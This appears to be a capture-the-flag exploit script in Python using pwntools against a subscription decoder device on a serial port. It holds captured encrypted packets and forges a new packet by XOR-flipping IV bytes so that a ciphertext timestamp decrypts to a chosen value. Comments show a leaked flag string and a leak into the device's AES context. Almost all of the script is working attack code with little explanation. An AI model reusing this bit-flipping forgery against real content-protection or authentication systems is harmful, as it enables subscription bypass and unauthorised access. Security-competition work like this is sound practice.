#!/usr/bin/env python3

from pwn import *
from decoder import DecoderIntf

context.arch = 'thumb'

def conn():
    r = DecoderIntf('/dev/ttyACM0')

    return r

def xor(a, b):
    return bytes(m ^ n for m, n in zip(a, b))

def main():
    r = conn()

    # 2025-03-17 23:31:38.130 | DEBUG    | decoder:list:190 - Found subscription for 3 from 2051486587364695 to 2105481534643172
    # 2025-03-17 23:31:38.130 | DEBUG    | decoder:list:190 - Found subscription for 2 from 1927911187552239 to 1996220537119053
    # 2025-03-17 23:31:38.130 | DEBUG    | decoder:list:190 - Found subscription for 1 from 2050984053243415 to 2093036970971573
    # [(3, 2051486587364695, 2105481534643172), (2, 1927911187552239, 1996220537119053), (1, 2050984053243415, 2093036970971573)]


    # leak = b'noflagonthischan^ flag ^00074c7ac115570d^ time ^0aae86824f2963d5\x00\x00\x00\x00L\xf7a\xd4\x85I\x9b\xd2\nH\x0b\xab\xf8*<\xd8G9V\xae\x9e`{\x0eb\xf1\x88)&\x8f\xf8\x80B@\xb5\xb4\x12\rO\xcbo\xed\xee\x1b\x98\x89J\x82\x13\xe6\x1b\xd3(\xaa1\xb5\x02\x91\xc1Q]\x1d!\x90\t\xfe\x14\xddA\xf0\xf5auW%\xfc\x00\xd0\x8c\xcb\x8c\xb5\xa5e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    # expired_checksum = b'\nH\x0b\xab\xf8*<\xd8G9V\xae\x9e`{\x0eb\xf1\x88)'

    with open('expired.sub', 'rb') as f:
        # channel 1
        sub = f.read()

    # r.subscribe(sub)
    # print(r.list())

    expire_packet = bytes.fromhex('020000003a9f43bb7a4c070040000000c485b217ebc0c6b133983c099d10643b36ad95c6ba2371ddcb2de0d8aa221c3948147a5f291fc258eacd0a789420cd5b6ad520df0ede87a920257c03be7c626e7c37da4882a5935bd8421f93a8ca7f426c8bbf3f9d15a07dcfd76b188eed526f9b5d0e567b8a8a2f3206d1124f2a6620')
    valid_packet0 = bytes.fromhex('000000000d5715c17a4c070040000000d184f0c59bad57035b91fe81a3ee78a252944486e427312a2163cca7d2406912730344fcdacbc59ff7a6712c2668d5c72424cdd426116cea671cce48728cca0d0b8a1227f729a04bbed2197d07cbf1e948b7bdbda2ce396e0e4c780245e8c66da75387ddae1c30b005897de999714c10')
    # channel 1
    # valid_packet = bytes.fromhex('010000005cf314f27b4c070040000000923097e04b3db4435c4c9a8dcc2dbb94d69077a7047458ce9bf77d9faaf5f75c802f6240c2e7720f920d238e73b771c58b2bbe9198b00e88feb9c30fcfeaf44c89dd2d238fb2104d791943d489d35c858515f2ccaa86d1743cd7ca3f3c14c50636131a6fbf1601d5a3fcea0f61faa69c')
    # channel 2
    # {"channel": 2, "timestamp": 2054420564919457, "encoded": "02000000a1c4fd0f7c4c070040000000dbe9a98a5c5ce4a7f8e525af4c9f65e7a82aa7653e8ec56826fda98c771161e7b880ffbc12a3836de591f473ba7753b56490e548ed21104adb17621ff2882743021b2b98d65f493de83dd6e800a9c8b3da14ec98ab7fa679c3b95cbffe9065a9ed45431ee9f90ca7fe78cef8899be0f6"}
    # valid_packet = bytes.fromhex('02000000a1c4fd0f7c4c070040000000dbe9a98a5c5ce4a7f8e525af4c9f65e7a82aa7653e8ec56826fda98c771161e7b880ffbc12a3836de591f473ba7753b56490e548ed21104adb17621ff2882743021b2b98d65f493de83dd6e800a9c8b3da14ec98ab7fa679c3b95cbffe9065a9ed45431ee9f90ca7fe78cef8899be0f6')
    # valid_time = 1927911187552239 + 20
    # iv = valid_packet[16:32]
    # timestamp = p64(2054420564919457)
    # ct_time = 12518142145650441510
    # new_iv = iv[:8] + xor(xor(p64(ct_time), p64(valid_time)), iv[8:16])
    # new_packet = valid_packet[:4] + p64(valid_time) + p32(0x200) + new_iv + valid_packet[32:]

    # {"channel": 4, "timestamp": 2054421396378328, "encoded": "04000000d8d28c417c4c070040000000f353df037b073944777e37c84baa0c5326032ca56cd0d859848ab5971287ac03254d9316342b0a56a7d0b41deada032e9222dc47889dadcffeaea8b5b32be1ef9540aee49c91a0865cb0c3e4ef016c5509da234997317b26d015d76d1b9ecf014c034493c70e4fab1ec88fc7189f26f2"}
    valid_packet = bytes.fromhex('04000000d8d28c417c4c070040000000f353df037b073944777e37c84baa0c5326032ca56cd0d859848ab5971287ac03254d9316342b0a56a7d0b41deada032e9222dc47889dadcffeaea8b5b32be1ef9540aee49c91a0865cb0c3e4ef016c5509da234997317b26d015d76d1b9ecf014c034493c70e4fab1ec88fc7189f26f2')
    valid_time = 1927911187552239 + 20
    iv = valid_packet[16:32]
    # timestamp = p64(2054420564919457)
    ct_time = 12518142145650441510
    new_iv = iv[:8] + xor(xor(p64(ct_time), p64(valid_time)), iv[8:16])
    new_packet = valid_packet[:4] + p64(valid_time) + p32(0x200) + new_iv + valid_packet[32:]

    # print(r.subscribe(sub))

    # print(r.list())

    # packet = bytes.fromhex('030000009f63b84c7a4c070040000000a2d1cb383a3b2236e4f7bb30e64b7a4ca66b69a580340cbaebde2700952d17d404d2afa50ccb1dfbe0e03a1feac733b793af5d3ec0c274e988842104389e3b82f7cd4dfdc41d2af341c96cf655b330c9dd972968b7efa5754ee4a219533624a1860583863d645e35b2dd1a52af5c1135')
    # leaks 0x44 offset into aes context
    out = r.decode(new_packet)
    print(out)


    # b = r.subscribe(b'example')
    # a = r.decode(b'example')



if __name__ == "__main__":
    main()
